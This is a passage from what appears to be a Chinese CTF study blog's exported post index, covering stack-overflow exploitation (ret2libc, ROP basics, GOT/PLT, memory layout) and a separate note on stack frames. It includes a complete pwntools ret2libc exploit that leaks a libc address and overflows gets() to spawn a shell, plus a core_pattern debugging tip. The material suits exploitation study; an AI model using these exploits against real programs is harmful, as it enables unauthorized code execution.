函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。 所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。 此外，libc中是一定存在”/bin/sh”的，所以字符串地址也可以获取。这方面工具做的很完善。 示例： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No surprise anymore, system disappeard QQ.&quot;); printf(&quot;Can you find it !?&quot;); gets((char *)&amp;v4); return 0;&#125; 思路： 泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) EXP如下： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *## 导入工具from LibcSearcher import LibcSearcher## 本地连接sh = process(&apos;./ret2libc3&apos;)## 将文件加载入进程ret2libc3 = ELF(&apos;./ret2libc3&apos;)##简化libc库中函数地址的表示方法puts_plt = ret2libc3.plt[&apos;puts&apos;]libc_start_main_got = ret2libc3.got[&apos;__libc_start_main&apos;]main = ret2libc3.symbols[&apos;main&apos;]## 监视程序进行到哪一步，提醒自己print &quot;leak libc_start_main_got addr and return to main again&quot;## puts函数泄露出start_main函数地址payload = flat([&apos;A&apos; * 112, puts_plt, main, libc_start_main_got])## 在输出前面字符串后，将payload输入sh.sendlineafter(&apos;Can you find it !?&apos;, payload)print &quot;get the related addr&quot;##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式libc_start_main_addr = u32(sh.recv()[0:4])##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr)## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。libcbase = libc_start_main_addr - libc.dump(&apos;__libc_start_main&apos;)## 已知基地址与相对地址，得到绝对地址system_addr = libcbase + libc.dump(&apos;system&apos;)binsh_addr = libcbase + libc.dump(&apos;str_bin_sh&apos;)## 监视程序进行到哪一步print &quot;get shell&quot;payload = flat([&apos;A&apos; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive() 0X05–稍作总结： ret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。 0X06–MISC: 1.最简单栈溢出，一套工具解决。 python pattern.py create 150 gdb X run (input) q(uit) python pattern.py offset (address) 即可得到溢出地址 2.注意是返回地址，不是/bin/sh本身在栈上。 3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。 4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。 5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。 6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。 7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。 8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。 9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。 10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。 PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。 11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分：1.栈区（stack）：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.堆区（heap)： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回 收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.数据区：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.代码区：存放函数体的二进制代码。 12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是 1\x3b\x84\x04\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。 13.常见的危险函数如下 输入 gets，直接读取一行，忽略’\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\x00’停止 strcat，字符串拼接，遇到’\x00’停止 bcopy 计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求 覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。 0X06–尚存在的问题: 1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。 2.ESP的调试为什么断点下在CALL处。 3.buf两端的问题。 4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。解决此问题最简单的方法就是开启core dump功能，即：ulimit -c unlimitedsudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 CTF-Wiki&gt;Linux Pwn: Stack Overflow principle Basic ROP 系统调用 Github上Libc版本库 LibcSearcher工具 现代栈溢出利用技术基础：ROP 一步一步学ROP之linux_x86篇 一步一步学ROP之linux_x64篇 手把手教你栈溢出从入门到放弃（上） 手把手教你栈溢出从入门到放弃（下） Linux下pwn从入门到放弃]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF Pwn stackoverflow ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈帧（stack frame）]]></title>
    <url>%2F2019%2F06%2F19%2FStack%20Frame%2F</url>
    <content type="text"><![CDATA[1.栈帧的作用：在程序中用于声明变量，调用函数。是利用EBP（栈帧指针）寄存器访问栈内局部变量，参数，函数返回地址等的手段。 2.在储存局部变量的值之前，都会执行SUB指令，为局部变量开辟空间。 3.汇编中的DWORD PTR SS:[EBP-4]理解为指针，意为地址EBP-4处有一个4字节大小 的内存空间。此句中，SS是Segment Memory Model的缩写，表示栈段，在Windows（使用段内存模型）下需要指出。EBP是指向栈的寄存器，所以加上SS寄存器。DWORD PTR与SS等字符串可以在OD设置中隐藏。 4.调用一个函数之前，先开辟出内存空间，在将参数压入栈，最后在执行函数之前，将返回地址压入栈。执行完毕之后将删除函数栈帧并返回至PUSH的返回地址。 5.注意参数入栈的顺序与C语言中参数顺序恰好相反（参数的逆向存储）。 6.调用约定（Calling Convention）：被调函数执行完后，由函数的调用者负责清理存储在栈中的参数，这种方式称为cdecl方式。由被调用者负责清理保存在栈中的参数，称为stdcall方式。 7.ESP为栈顶指针，EBP为栈帧指针。程序运行过程中，ESP是随时变化的，访问内存中的局部变量和参数等如果以此为基址会十分困难。所以程序开始时会PUSH EBP,MOV EBP,ESP.将ESP的值保存在EBP中并且维持在函数内部，这样无论ESP如何变化，以EBP为基准都能准确地访问到局部变量与参数。执行完这两条命令，就可以说栈帧已经生成了。 8.XOR命令用来进行异或运算，Exclusive OR bit，其特点为两个相同的值进行异或运算的结果为0.XOR命令的执行速度比 MOV EAX,0 要快，常用于寄存器初始化操作。 9.编译器中的”优化“（optimization）选项开启后，编译出来的简单函数将不会生成栈帧。 10.牢记：栈是用来存放参数，变量，地址等数据的，不是用来存放代码的。]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn function</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Genesis]]></title>
    <url>%2F2019%2F06%2F17%2FGenesis%2F</url>
    <content type="text"><![CDATA[Earthquake and Blog]]></content>
  </entry>
</search>
